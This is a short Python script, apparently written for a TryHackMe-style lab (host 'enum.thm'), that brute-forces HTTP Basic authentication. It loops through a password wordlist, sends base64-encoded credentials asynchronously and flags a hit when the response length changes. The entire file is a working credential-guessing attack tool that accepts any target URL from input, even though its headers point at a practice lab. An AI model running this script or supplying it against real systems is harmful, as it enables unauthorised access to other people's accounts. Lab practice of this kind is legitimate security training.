import base64
import os
import aiohttp
import asyncio
import pyfiglet

ascii_banner = pyfiglet.figlet_format("Bruteforcing http in 2k24\n by  Mahmoud\n and ALhussein\n ")
print(ascii_banner)

async def check_pass(url,username,path): 

 
  wordlist = os.path.join(os.getcwd(), path) 
  try:
     with open(wordlist, 'r', encoding='utf-8') as file:
        passwords=file.readlines()
  except UnicodeDecodeError:
      with open(wordlist,'r',encoding='ISO-8859-1') as file:
         passwords=file.readlines() 

  previous_response_length=0
  async with aiohttp.ClientSession() as session: 
      for password in passwords :
       password=password.strip()

       userpass=f"{username}:{password}" 
       b64=base64.b64encode(userpass.encode()).decode() 

       header={
       'Host': 'enum.thm',
       'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
       'Accept-Language': 'en-US,en;q=0.5',
       'Accept-Encoding': 'gzip, deflate, br',
       'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
       'X-Requested-With': 'XMLHttpRequest',
       'Referer': 'http://enum.thm/labs/basic_auth/',
       'Authorization': f'Basic {b64}' 
      }
       async with session.post(url, headers=header) as response:
        response_txt=await response.text()
        response_length = len(response_txt)
        print(f"triedpasswords:{password},responselength:{response_length}")
        if response_length != previous_response_length and previous_response_length != 0:
          print(f"password found:{password}")
          break 
       previous_response_length = response_length
    

if __name__ == "__main__":
   url = input('enter the url:')
   username = input('enter a username or a prefix:') 
   path = input('enter the path of world list:')
   asyncio.run(check_pass(url,username,path))
